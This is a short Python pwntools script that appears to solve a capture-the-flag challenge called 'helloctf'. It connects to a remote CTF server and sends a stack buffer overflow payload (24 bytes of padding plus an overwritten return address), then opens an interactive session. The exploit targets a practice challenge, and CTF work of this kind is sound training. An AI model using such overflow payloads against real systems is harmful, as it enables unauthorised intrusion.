#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./helloctf"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

c = process(pwn_file)
dbg_script = """
"""
#gdb.attach(c,dbg_script)
c = remote('ctf.adl.tw', '11001')
c.sendlineafter('CTF', b'A' * (16 + 8) + p64(0x4006c7))
c.interactive()
c.close()
